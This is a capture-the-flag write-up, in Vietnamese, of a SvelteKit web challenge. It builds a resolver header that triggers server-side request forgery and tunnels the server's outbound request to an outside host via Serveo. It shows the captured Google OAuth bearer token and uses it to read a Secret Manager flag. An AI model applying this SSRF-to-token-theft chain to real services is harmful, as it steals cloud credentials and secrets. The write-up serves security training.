# Cloudy with a Chance of Spaceships - Web (67 pts)

**Flag:** `CSSCTF{your_forecast_says_love_is_on_its_way}`
**Tài nguyên:** Không có tập tin đính kèm. Toàn bộ dữ liệu được trích xuất trực tiếp từ máy chủ dịch vụ đang vận hành (thông qua tệp `files/index.html` kích thước 1827 B và tệp mã nguồn `files/2.CftUi-UM.js` kích thước 5694 B, SHA256 `2cc74b92...b97e173`).

## Đề bài

Hệ thống cung cấp một ứng dụng web xây dựng bằng SvelteKit tại địa chỉ `http://34.116.80.78:9143/`. Giao diện hiển thị danh sách năm tàu vũ trụ và cung cấp chức năng "đo nhiệt độ thân tàu" thông qua các nút bấm tương ứng. Gợi ý đính kèm của đề bài là: "What's your forecast looking like?". Mục tiêu cuối cùng là thu thập cờ (flag) có định dạng chuẩn `CSSCTF{...}`.
Đặc điểm kỹ thuật: Giao diện hoàn toàn không có trường nhập liệu (input form). Mọi tương tác của người dùng đều kích hoạt một lệnh gọi mạng tới địa chỉ `/api/v1/ship/<tên>/temperature`, sau đó ứng dụng sẽ hiển thị một giá trị số.

## Phân tích ban đầu

Kiểm tra phản hồi từ đường dẫn gốc (`GET /`), hệ thống trả về thông số `x-sveltekit-page: true` và phần header `link:` liệt kê toàn bộ các gói (bundle) đính kèm. Dữ liệu trạng thái kết xuất phía máy chủ (server-rendered data) là `null`, đồng thời tuyến API (route) không được cấu hình hiển thị trực tiếp trong mã HTML. Do đó, quy trình phân tích yêu cầu phải trích xuất tệp Javascript `_app/immutable/nodes/2.CftUi-UM.js`. Quá trình kiểm tra tệp này phát hiện các đoạn mã trọng tâm sau:

```javascript
async function T(a,t,e){
  const r=a.currentTarget.textContent;
  ot(t,{ship:r},!0);
  C(t).temp=await(await fetch(`/api/v1/ship/${encodeURIComponent(r)}/temperature`,
    {headers:{"X-Resolver":e}})).text();
}
const e="XeyJyZXNvbHZlciI6Imh0dHBzOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1NwYWNlX3dlYXRoZXIifQ==";
```

Biến `e` là một hằng số được khởi tạo sẵn trong gói. Phần chuỗi theo sau ký tự `X` ban đầu chính là đoạn mã hóa Base64 của chuỗi JSON `{"resolver":"https://en.wikipedia.org/wiki/Space_weather"}`. Theo đó, Header mạng được xây dựng dựa trên định dạng `"X" + base64(json)`, và chuỗi JSON này chỉ chứa một khóa duy nhất là `resolver`.

Tiến hành kiểm thử cấu trúc Header trực tiếp đối với máy chủ (dữ liệu được lưu trong `analysis/resolver_probe.log`):

```text
Trường hợp thiếu header                       : Trả về HTTP 451, body= (rỗng)
Trường hợp định dạng không phải base64        : Trả về HTTP 451, body= (rỗng)
Trường hợp chuỗi base64 khuyết khóa resolver : Trả về HTTP 451, body= (rỗng)
Địa chỉ wikipedia Space_weather               : Trả về HTTP 200, body=3604.6
Địa chỉ example.com (https)                   : Trả về HTTP 200, body=71.3
Địa chỉ example.com (http)                    : Trả về HTTP 200, body=71.3
Địa chỉ 1.1.1.1 (http)                        : Trả về HTTP 200, body=5661.4
Địa chỉ 1.1.1.1 (https)                       : Trả về HTTP 200, body=5661.4
Địa chỉ 8.8.8.8 (không chứa HTTP)             : Trả về lỗi TimeoutError
Địa chỉ nội bộ 127.0.0.1                      : Trả về HTTP 500, body=<!doctype html>
```

Từ bảng kết quả kiểm thử, hệ thống rút ra ba nguyên tắc hoạt động cốt lõi:
1. Kết quả phản hồi thay đổi phụ thuộc vào URL truyền vào, hoàn toàn không phụ thuộc vào tên tàu vũ trụ. (Việc thử nghiệm một tàu không có thực như `Zhiping` vẫn trả về giá trị `71.3` - theo `analysis/temperature_probe.log`). Lệnh `encodeURIComponent` ở máy khách chỉ dùng để bảo vệ cấu trúc chuỗi, không đóng vai trò tham số điện toán.
2. Việc sử dụng giao thức `http` hay `https` đều trả về một giá trị tương đồng đối với cùng một trang, xác nhận giao thức không ảnh hưởng tới kết quả tính toán.
3. Việc thiếu Header hoặc lỗi cú pháp đều bị từ chối bằng mã 451. Hệ thống không có cấu hình dự phòng mặc định, do đó trường `resolver` luôn bị kiểm soát và định tuyến theo dữ liệu truyền vào.

## Chuỗi khai thác

**Bước 1 - Khởi tạo Header theo đúng tiêu chuẩn của gói (bundle).** 
Cấu trúc yêu cầu ký tự tiền tố `X` kết hợp với chuỗi base64 của một JSON chứa khóa `resolver`. Việc giữ lại ký tự `X` là bắt buộc do máy chủ thực thi bước kiểm duyệt cú pháp chuỗi này:

```python
def resolver_header(url):
    return "X" + base64.b64encode(json.dumps({"resolver": url}).encode()).decode()
```

**Bước 2 - Khai thác thông qua SSRF (Server-Side Request Forgery).** 
Do quá trình xử lý diễn ra trên máy chủ, cần thiết lập một cổng hứng dữ liệu (callback) để kiểm chứng lưu lượng trả về. Phương án khả thi là sử dụng dịch vụ đường hầm qua tính năng chuyển tiếp cổng `ssh` (port forwarding) bằng Git Bash:

```bash
python analysis/catch_auth.py 8911
ssh -R 80:localhost:8911 serveo.net
```

Dịch vụ Serveo phản hồi một địa chỉ công khai, ví dụ: `https://b838ca5ccee1ee4e-42-118-254-242.serveousercontent.com`. Đoạn mã `catch_auth.py` có nhiệm vụ lưu lại các luồng JSON request vào tệp `analysis/auth.log` và phản hồi nội dung ngẫu nhiên (`CLOUDY-<epoch>`) nhằm đảm bảo kết quả số thay đổi qua từng phiên, chứng minh máy chủ đã thực sự đọc nội dung phản hồi. Kịch bản `exploit.py` thực hiện gọi tới `/api/v1/ship/Cassini/temperature` với `resolver` trỏ về địa chỉ callback vừa thiết lập:

```text
[+] Khai thác SSRF thành công, HTTP 200, giá trị temperature='2.4'
```

**Bước 3 - Trích xuất thông tin định danh (Credential).** 
Dịch vụ Serveo có khả năng duy trì nguyên trạng phần header do máy khách gửi đi (chỉ bổ sung các cờ `x-forwarded-*`). Các luồng thông tin thu thập được phản ánh chính xác cấu trúc mà ứng dụng phát sinh (`analysis/capture.log`, chuỗi token được lược bớt để bảo mật). Máy chủ lưu vết đường dẫn tại gốc `/` do cấu hình định tuyến của serveo.

```text
=== 2026-10-01T09:25:42+00:00 GET /
    {
  "authorization": "Bearer ya29.c.c0AZ4...<1012 ký tự đã lược>...d803yu",
  "user-agent": "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)",
  "accept-encoding": "gzip,deflate",
  "x-real-ip": "34.116.80.78"
}
```

Dữ liệu ghi nhận ba yêu cầu diễn ra liên tiếp trong cùng một phút chứa một token định danh giống hệt nhau. Điều này chứng minh hệ thống đang áp dụng cơ chế bộ nhớ đệm (caching) cho token. Khi phiên hoạt động giãn cách khoảng 20 phút, token mới được khởi tạo và phát hiện giá trị `expires_in` của token mới là 3363 giây.

**Bước 4 - Xác thực tính hợp lệ của token.** 
Gửi token lên điểm cuối `oauth2.googleapis.com/tokeninfo`. Hệ thống xác nhận và định danh đây là Access Token chuẩn của nền tảng Google OAuth, loại bỏ khả năng token là một chuỗi giả lập.

```text
[+] Kiểm tra tokeninfo: HTTP 200, phạm vi scope=https://www.googleapis.com/auth/cloud-platform, exp=1790850141, expires_in=3333
```

**Bước 5 - Truy tìm danh tính dự án.** 
Nỗ lực gọi dịch vụ `cloudresourcemanager` bị chặn bởi mã lỗi 403 (do không được kích hoạt), nhưng chính phản hồi lỗi này đã làm lộ thông tin Project Number. Dịch vụ `storage` cấp quyền thực thi một phần, và thông báo lỗi 403 của nó đã tiết lộ trực tiếp tài khoản dịch vụ (Service Account) và Project ID:

```text
[+] Phản hồi HTTP 403 tiết lộ Project Number 613713115850
[+] Lỗi 403 của Storage tiết lộ danh tính: meteorologist@css-ctf-2026.iam.gserviceaccount.com và Project ID css-ctf-2026
```

Việc tài khoản dịch vụ sử dụng từ khóa `meteorologist` (nhà khí tượng học) hoàn toàn phù hợp với ngữ cảnh giả định của bài toán (người dự báo thời tiết của đội tàu).

**Bước 6 - Khai thác Secret Manager.** 
Với quyền hạn (scope) ở mức `cloud-platform`, quá trình truy xuất hệ thống `secretmanager` đã thành công. Toàn bộ tài khoản dự án chỉ có duy nhất một bí mật, một phiên bản. Phương thức gọi truy xuất `:access` trực tiếp trả về giá trị cờ (flag):

```text
[+] Kiểm tra secretmanager: HTTP 200, totalSize=1, danh sách secrets=['goog_encryption_secret']
[+] Truy xuất goog_encryption_secret@1 (45 ký tự) = CSSCTF{your_forecast_says_love_is_on_its_way}
```

**Kiểm chứng:** Token được thu thập và sử dụng hoàn toàn dưới dạng thô qua cấu trúc đường hầm (tunnel), không có dữ liệu chèn cứng trong mã kịch bản. Kịch bản `exploit.py` chỉ báo hiệu thành công (exit 0) khi payload giải mã chứa tiền tố `CSSCTF{`, đồng thời xuất kết quả vào tệp `flag.txt`. Chuỗi kết quả gồm 45 ký tự hiển thị được, đáp ứng định dạng cờ chuẩn, và nội dung chuỗi có liên quan trực tiếp tới câu hỏi định hướng của thử thách. Tiến hành tái lập lại quy trình 3 lần riêng biệt bằng 3 mã token khác nhau đều đưa ra kết quả đồng nhất.

## Flag

Quá trình thực thi mã kịch bản:

```bash
python exploit.py https://<hash>-<ip>.serveousercontent.com
```

```text
[+] Khởi tạo http://34.116.80.78:9143/ -> HTTP 200, tiêu đề='Cloudy with a Chance of Spaceships'
[+] Khai thác SSRF -> HTTP 200, giá trị temperature='2.4'
[+] Trích xuất token từ auth.log: Phát hiện 3 bản, đang sử dụng bản mới nhất (1024 ký tự)
[+] Kiểm tra tokeninfo -> HTTP 200, phạm vi scope=https://www.googleapis.com/auth/cloud-platform, exp=1790850141, expires_in=3333
[+] Phản hồi HTTP 403 tiết lộ Project Number 613713115850
[+] Phản hồi 403 của storage xác thực tài khoản meteorologist@css-ctf-2026.iam.gserviceaccount.com và Project ID css-ctf-2026
[+] Kiểm tra secretmanager -> HTTP 200, totalSize=1, secrets=['goog_encryption_secret']
[+] Trích xuất dữ liệu goog_encryption_secret@1 (45 ký tự) = CSSCTF{your_forecast_says_love_is_on_its_way}
[+] Đã lưu cấu trúc cờ vào flag.txt
```

Kết quả:
```text
CSSCTF{your_forecast_says_love_is_on_its_way}
```
